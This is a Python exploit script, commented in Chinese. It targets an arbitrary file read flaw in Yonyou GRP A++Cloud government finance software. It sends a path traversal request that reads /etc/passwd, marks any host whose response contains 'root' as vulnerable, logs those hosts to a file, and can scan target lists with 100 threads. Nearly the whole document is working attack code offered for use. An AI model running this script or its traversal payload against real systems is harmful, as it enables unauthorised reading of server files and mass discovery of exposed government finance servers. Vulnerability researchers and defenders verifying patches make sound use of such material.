import argparse
import sys
import requests
from multiprocessing.dummy import Pool
import logging

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    banner = r'''         

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|





                            version:1.1.0
                            author:fangwei   
'''
    logging.info(banner)


def poc(target):
    url = target + "/ma/emp/maEmp/download?fileName=../../../etc/passwd"
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,'
                  '*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'If-Modified-Since': 'Wed, 11 Oct 2023 05:16:05 GMT',
        'Connection': 'close',
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        # 发送请求，禁用自动重定向
        res = requests.get(url, headers=headers, verify=False, timeout=5, allow_redirects=False)

        if res.status_code == 302:
            logging.info(f"[*] 该网站存在302重定向 {target}")
            return  # 处理302重定向的情况

        if res.status_code == 200 and "root" in res.text:
            logging.info(f"[+] {GREEN}存在漏洞{target}\n{RESET}")
            with open("yonyoure.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            logging.info(f"[-] 不存在漏洞")
    except Exception as e:
        logging.error(f"[*]无法访问 {target}, 错误信息: {e}")


def main():
    banner()
    # 处理命令行参数
    parser = argparse.ArgumentParser(description='用友GRP A++Cloud 政府财务云 任意文件读取漏洞')
    # 添加两个参数
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logging.error(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':  # 主函数入口
    main()  # 入口
